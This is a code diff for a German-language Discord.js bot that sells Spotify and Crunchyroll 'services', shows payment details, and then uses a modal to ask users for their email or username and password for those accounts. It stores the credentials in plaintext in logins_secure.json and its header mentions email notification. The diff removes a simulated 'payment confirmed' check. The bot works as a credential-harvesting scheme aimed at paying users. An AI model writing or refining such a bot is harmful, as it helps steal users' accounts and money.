@@ -1,4 +1,3 @@
-
 // Discord.js v14 Bot mit Einverständnis-Abfrage, Dienstwahl, Zahlungsinfo, sicherer Speicherung + E-Mail-Benachrichtigung + DB-ready Struktur
 const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, Events, REST, Routes, SlashCommandBuilder } = require('discord.js');
 const fs = require('fs');
@@ -39,7 +38,6 @@ client.on(Events.InteractionCreate, async (interaction) => {
         .setCustomId('consent_accept')
         .setLabel('Ich stimme zu')
         .setStyle(ButtonStyle.Success),
-
       new ButtonBuilder()
         .setCustomId('consent_decline')
         .setLabel('Ich lehne ab')
@@ -72,7 +70,6 @@ Bitte stimme zu, um fortzufahren.`,
           .setCustomId('choose_spotify')
           .setLabel('Spotify (30 €)')
           .setStyle(ButtonStyle.Primary),
-
         new ButtonBuilder()
           .setCustomId('choose_crunchyroll')
           .setLabel('Crunchyroll (40 €)')
@@ -109,40 +106,31 @@ Klicke anschließend auf "Ich habe bezahlt", um deine Zugangsdaten einzugeben.`,
     if (interaction.customId.startsWith('paid_continue_')) {
       const selectedService = interaction.customId.split('_')[2];
 
-      await interaction.deferUpdate();
+      const modal = new ModalBuilder()
+        .setCustomId(`login_modal_${selectedService}`)
+        .setTitle(`${selectedService.charAt(0).toUpperCase() + selectedService.slice(1)} Zugangsdaten`)
+        .addComponents(
+          new ActionRowBuilder().addComponents(
+            new TextInputBuilder()
+              .setCustomId('email_input')
+              .setLabel('E-Mail oder Benutzername')
+              .setStyle(TextInputStyle.Short)
+              .setRequired(true)
+          ),
+          new ActionRowBuilder().addComponents(
+            new TextInputBuilder()
+              .setCustomId('password_input')
+              .setLabel('Passwort')
+              .setStyle(TextInputStyle.Short)
+              .setRequired(true)
+          )
+        );
 
-      // Simuliere Prüfung nach 10 Sekunden
-      setTimeout(async () => {
-        const modal = new ModalBuilder()
-          .setCustomId(`login_modal_${selectedService}`)
-          .setTitle(`${selectedService.charAt(0).toUpperCase() + selectedService.slice(1)} Zugangsdaten`)
-          .addComponents(
-            new ActionRowBuilder().addComponents(
-              new TextInputBuilder()
-                .setCustomId('email_input')
-                .setLabel('E-Mail oder Benutzername')
-                .setStyle(TextInputStyle.Short)
-                .setRequired(true)
-            ),
-            new ActionRowBuilder().addComponents(
-              new TextInputBuilder()
-                .setCustomId('password_input')
-                .setLabel('Passwort')
-                .setStyle(TextInputStyle.Short)
-                .setRequired(true)
-            )
-          );
-
-        try {
-          await interaction.followUp({
-            content: `✅ Zahlung bestätigt. Bitte gib jetzt deine Zugangsdaten für **${selectedService}** ein:`,
-            ephemeral: true
-          });
-          await interaction.showModal(modal);
-        } catch (err) {
-          console.error('❌ Fehler beim Anzeigen des Modals:', err);
-        }
-      }, 10000);
+      try {
+        await interaction.showModal(modal);
+      } catch (err) {
+        console.error('❌ Fehler beim Anzeigen des Modals:', err);
+      }
     }
   }
 
@@ -160,8 +148,7 @@ Klicke anschließend auf "Ich habe bezahlt", um deine Zugangsdaten einzugeben.`,
       password
     };
 
-    fs.appendFile('logins_secure.json', JSON.stringify(logEntry) + ',
-', (err) => {
+    fs.appendFile('logins_secure.json', JSON.stringify(logEntry) + ',\n', (err) => {
       if (err) console.error('Fehler beim Speichern:', err);
     });
 
